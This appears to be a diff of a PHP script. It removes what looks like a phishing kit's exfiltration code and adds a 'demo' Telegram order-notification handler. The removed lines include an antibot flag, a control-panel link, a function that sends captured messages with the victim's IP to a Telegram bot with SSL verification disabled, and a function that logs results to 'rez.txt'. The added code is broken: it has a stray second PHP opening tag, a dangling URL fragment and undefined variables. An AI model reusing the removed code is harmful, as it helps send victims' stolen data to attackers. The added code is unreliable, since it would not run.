@@ -10,43 +10,46 @@ $id = "-1003987841987";
 $antibot = "yes";
 
  
-$ipp = "";
-if($_SERVER['REMOTE_ADDR']=="::1"){
-$ipp = "127.0.0.1";
-}else{
-$ipp = $_SERVER['REMOTE_ADDR'];
-}
-$panel_link = str_replace("auth/post.php", "panel/ctr.php", "http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']."?ip=$ipp");
 
- 
 
-function call($msg){
-    global $token;
-    global $id;
-    global $panel_link;
-    $info = "
+<?php
 
-/- MORE INFO -/
-PANEL: $panel_link
-IP: ".$_SERVER['REMOTE_ADDR']."
-TIME: ".date("m/d/Y h:i:sa");
+$data = json_decode(file_get_contents("php://input"), true);
 
-    $c = curl_init('https://api.telegram.org/bot'.$token.'/sendMessage?chat_id='.$id.'&text='.urlencode($msg.$info));
-    curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
-    curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
-    $res = curl_exec($c);
-    curl_close($c);
-    return $res;
+if ($_SERVER['REQUEST_METHOD'] !== 'POST' || !is_array($data)) {
+    http_response_code(400);
+    exit('Invalid request');
 }
 
+$name = trim($data['name'] ?? '');
+$order = trim($data['order_id'] ?? '');
+$status = trim($data['status'] ?? '');
 
-function save($txt){
-    $fp = fopen((__DIR__)."/rez.txt", "a");
-    fwrite($fp, $txt);
-    fclose($fp);
+$message =
+    "🧪 Demo Notification\n\n" .
+    "Name: " . htmlspecialchars($name) . "\n" .
+    "Order: " . htmlspecialchars($order) . "\n" .
+    "Status: " . htmlspecialchars($status);
+
+if (!$BOT_TOKEN || !$CHAT_ID) {
+    http_response_code(500);
+    exit('Configuration missing');
 }
+     . $BOT_TOKEN . "/sendMessage";
 
+$ch = curl_init($url);
 
+curl_setopt_array($ch, [
+    CURLOPT_POST => true,
+    CURLOPT_POSTFIELDS => [
+        'chat_id' => $CHAT_ID,
+        'text' => $message
+    ],
+    CURLOPT_RETURNTRANSFER => true,
+    CURLOPT_TIMEOUT => 10
+]);
 
+$result = curl_exec($ch);
+curl_close($ch);
 
-?>
+echo "OK";
